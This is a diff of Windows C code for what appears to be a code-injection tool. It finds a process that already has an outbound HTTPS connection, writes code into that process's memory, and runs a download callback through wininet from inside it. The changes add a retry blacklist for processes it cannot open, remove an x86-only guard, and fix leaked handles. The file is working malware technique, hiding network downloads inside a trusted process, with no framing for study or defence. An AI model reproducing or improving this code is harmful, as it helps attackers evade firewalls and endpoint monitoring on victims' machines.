@@ -13,6 +13,12 @@
 
 #define URL_MAX_SIZE 1024
 
+typedef struct _BLACKLIST_PROC
+{
+	DWORD* lpdwTable;
+	DWORD dwCount;
+} BLACKLIST_PROC;
+
 typedef struct _CALLBACK_IN
 {
 	USHORT nPort;
@@ -82,7 +88,7 @@ static LPVOID MemSet(LPVOID lpAddr, BYTE bValue, DWORD dwSize)
 	return lpAddr;
 }
 
-DWORD FindTargetProcessId(USHORT nRemotePort)
+DWORD FindTargetProcessId(USHORT nRemotePort, BLACKLIST_PROC* lpBlacklistProc)
 {
 	PMIB_TCPTABLE_OWNER_PID lpPidTable = NULL;
 
@@ -115,6 +121,19 @@ DWORD FindTargetProcessId(USHORT nRemotePort)
 
 	for (DWORD i = 0; i < lpPidTable->dwNumEntries; i++) {
 
+		BOOL bIsBlacklisted = FALSE;
+
+		for (DWORD j = 0; j < lpBlacklistProc->dwCount; j++) {
+			if (lpBlacklistProc->lpdwTable[j] == lpPidTable->table[i].dwOwningPid) {
+				bIsBlacklisted = TRUE;
+				break;
+			}
+		}
+
+		if (bIsBlacklisted) {
+			continue;
+		}
+
 		if (lpPidTable->table[i].dwOwningPid <= 4) {
 			continue;
 		}
@@ -130,7 +149,7 @@ DWORD FindTargetProcessId(USHORT nRemotePort)
 		if (!lpPidTable->table[i].dwRemoteAddr || lpPidTable->table[i].dwRemoteAddr == 0x100007F) {
 			continue;
 		}
-#ifdef _M_IX86
+//#ifdef _M_IX86
 		HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE32, lpPidTable->table[i].dwOwningPid);
 		if (hModuleSnap == INVALID_HANDLE_VALUE && GetLastError() == ERROR_PARTIAL_COPY) { // if x64
 			continue;
@@ -138,7 +157,7 @@ DWORD FindTargetProcessId(USHORT nRemotePort)
 		else {
 			CloseHandle(hModuleSnap);
 		}
-#endif
+//#endif
 		dwTargetProcessId = lpPidTable->table[i].dwOwningPid;
 		break;
 	}
@@ -175,6 +194,7 @@ BOOL VirtualExecuteEx(HANDLE hProcess, LPTHREAD_START_ROUTINE lpFunction, LPDWOR
 
 		if (lpRemoteParameters != NULL) {
 			if (!WriteProcessMemory(hProcess, lpRemoteParameters, lpParameters, dwParametersSize, NULL)) {
+				VirtualFreeEx(hProcess, lpRemoteParameters, 0, MEM_RELEASE);
 				VirtualFreeEx(hProcess, lpTargetImage, 0, MEM_RELEASE);
 				return FALSE;
 			}
@@ -390,6 +410,8 @@ DWORD WINAPI DownloadCallback(LPVOID lpThreadParameter)
 		dwRetCode = CC_NETCONN_ERR;
 	}
 
+	fnInternetCloseHandle(hNet);
+
 	FreeLibrary(hWininet);
 
 	MemFree(lpUrlComponents->lpszUrlPath);
@@ -424,6 +446,8 @@ DWORD WINAPI DownloadCallback(LPVOID lpThreadParameter)
 
 	MemFree(lpCallbackOut);
 
+	CloseHandle(hExecutorProcess);
+
 	return CC_OK;
 }
 
@@ -448,17 +472,26 @@ int main()
 	const TCHAR tszUrl[] = TEXT("https://google.com");
 	const USHORT nPort = INTERNET_DEFAULT_HTTPS_PORT;
 
-	DWORD dwTargetProcessId = 0;
-	while (!dwTargetProcessId)
-		dwTargetProcessId = FindTargetProcessId(nPort);
+	BLACKLIST_PROC BlacklistProc = { 0 };
+	HANDLE hTargetProcess = NULL;
+	do {
+		DWORD dwTargetProcessId = 0;
+		while (!dwTargetProcessId) {
+			dwTargetProcessId = FindTargetProcessId(nPort, &BlacklistProc);
+		}
 
-	printf("Target process id: %d\n", dwTargetProcessId);
+		printf("Target process id: %d\n", dwTargetProcessId);
 
-	HANDLE hTargetProcess;
-	if ((hTargetProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, dwTargetProcessId)) == NULL) {
-		printf("Unable to open target process\n");
-		return 0;
-	}
+		if ((hTargetProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, dwTargetProcessId)) == NULL) {
+			BlacklistProc.lpdwTable = MemRealloc(BlacklistProc.lpdwTable, (BlacklistProc.dwCount + 1) * sizeof(DWORD));
+			BlacklistProc.lpdwTable[BlacklistProc.dwCount] = dwTargetProcessId;
+			BlacklistProc.dwCount += 1;
+			printf("Unable to open process(%d)\n", BlacklistProc.dwCount);
+		}
+
+	} while (hTargetProcess == NULL);
+
+	printf("Process handle: 0x%p\n", hTargetProcess);
 
 	CALLBACK_IN InParams = { 0 };
 	CreateCallbackParameters(&InParams, tszUrl, nPort);
@@ -484,7 +517,6 @@ int main()
 	}
 
 	DestroyCallbackParameters(&InParams);
-
 
 	return 0;
 }
